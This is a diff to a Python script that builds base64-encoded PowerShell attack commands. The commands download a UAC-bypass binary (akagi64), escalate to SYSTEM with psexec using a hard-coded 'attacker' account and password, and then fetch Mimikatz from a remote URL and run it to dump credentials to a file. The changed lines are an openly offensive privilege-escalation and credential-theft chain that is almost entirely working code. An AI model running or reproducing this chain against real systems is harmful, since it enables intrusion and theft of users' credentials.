@@ -37,25 +37,32 @@ powershell_command += "IEX $browser.DownloadFile('" + url_akagi64 + "','C:\\Prog
 
 
 # run command as user: attacker
-command_attacker += "C:\\ProgramData\akagi64.exe 3 "
-command_attacker += "\"cmd /c C:\\ProgramData\\psexec -i -s "
-command_attacker += command +"\""
+command_attacker = ''
+command_attacker += "C:\\ProgramData\\akagi64.exe 3 "
+command_attacker += "C:\\ProgramData\\psexec -i -s "
+command_attacker += "PowerShell.exe -Exec ByPass -Nol -Enc "
+
 admin_cmd = "$browser = New-Object System.Net.WebClient; $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;"
-admin_cmd += "IEX $browser.DownloadString('" + url_mimikatz + "'); Invoke-Mimikatz -DumpCreds"
+admin_cmd += "IEX $browser.DownloadString('" + url_mimikatz + "'); $result = Invoke-Mimikatz -DumpCreds;"
+admin_cmd += "$result | out-file -filepath C:\\programdata\\mimi.txt -append;"
 
 admin_cmd_b64 = cmd_to_base64(admin_cmd)
 print "Mimikatz cmd:\n\n"
-print command_attacker + " " + admin_cmd_b64
+print command_attacker + " " + admin_cmd_b64 + " > foo.txt"
 print "---------------------------------"
 
 
 
-powershell_command += "C:\\ProgramData\\psexec.exe /accepteula -i -u attacker -p Test123! " + command_attacker + " " + admin_cmd_b64
+powershell_command += "C:\\ProgramData\\psexec.exe /accepteula -i -u attacker -p Test123! " + command_attacker + " " + admin_cmd_b64 + "\""
 
 print "-------------------------------------------------"
 
 command += cmd_to_base64(powershell_command)
 print command
 
+
+
+print '-'*50
+print cmd_to_base64("calc.exe")
 
 
